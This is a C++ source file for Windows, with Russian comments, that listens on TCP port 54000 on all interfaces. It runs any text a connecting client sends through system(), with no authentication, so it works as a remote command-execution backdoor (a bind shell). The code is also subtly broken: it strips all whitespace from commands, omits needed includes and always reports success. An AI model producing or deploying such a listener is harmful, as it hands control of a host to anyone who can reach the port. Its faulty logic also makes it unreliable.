#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
// Порт прослушивания
#define PORT 54000

int main() {
    setlocale(LC_ALL, "Russian");
    // Инициализация сокетов
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "Ошибка инициализации Winsock" << std::endl;
        return 1;
    }

    // Создание сокета сервера
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Ошибка создания сокета сервера" << std::endl;
        return 1;
    }

    // Заполнение структуры sockaddr_in для сокета сервера
    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Привязка сокета сервера к адресу
    if (bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Ошибка привязки сокета сервера" << std::endl;
        return 1;
    }

    // Установка сокета сервера на прослушивание
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Ошибка установки сокета сервера на прослушивание" << std::endl;
        return 1;
    }

    // Основной цикл сервера, ожидание подключений
    while (true) {
        // Прием подключения клиента
        SOCKET clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Ошибка приема подключения клиента" << std::endl;
            continue;
        }

        // Получение и выполнение команды от клиента
        char command[1024];
        int commandLength = recv(clientSocket, command, sizeof(command), 0);
        if (commandLength <= 0) {
            std::cerr << "Ошибка получения команды от клиента" << std::endl;
        }
        else {
            // Удаляем лишние символы в конце строки
            std::string commandString(command, commandLength);
            commandString.erase(std::remove_if(commandString.begin(), commandString.end(), [](unsigned char c) { return std::isspace(c); }), commandString.end());

            // Выполнение команды в локальной системе
            system(commandString.c_str());

            // Отправка результата клиенту
            std::string result = "Команда выполнена успешно";
            // Удаляем лишние символы в конце строки
            result.erase(std::remove_if(result.begin(), result.end(), [](unsigned char c) { return std::isspace(c); }), result.end());
            send(clientSocket, result.c_str(), result.length(), 0);
        }

        // Закрытие сокета клиента
        closesocket(clientSocket);
    }
    // Закрытие сокета сервера
    closesocket(serverSocket);

    // Освобождение ресурсов Winsock
    WSACleanup();

    return 0;
}
